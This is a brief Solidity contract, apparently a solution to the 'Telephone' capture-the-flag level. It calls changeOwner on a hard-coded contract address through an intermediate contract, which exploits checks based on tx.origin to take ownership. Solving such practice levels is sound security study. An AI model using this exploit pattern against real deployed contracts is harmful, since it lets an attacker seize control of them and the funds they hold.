// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IAttackTelephone {
    function changeOwner(address _owner) external;
}

contract Attack {
    address telephoneInstance = 0xbB041Ea6EB569A9DDD55b4760be24B9d5f743ac8;
    IAttackTelephone attackTelephoneContract = IAttackTelephone(telephoneInstance);
    function attackTelephone(address _owner) public {
        attackTelephoneContract.changeOwner(_owner);
    }
}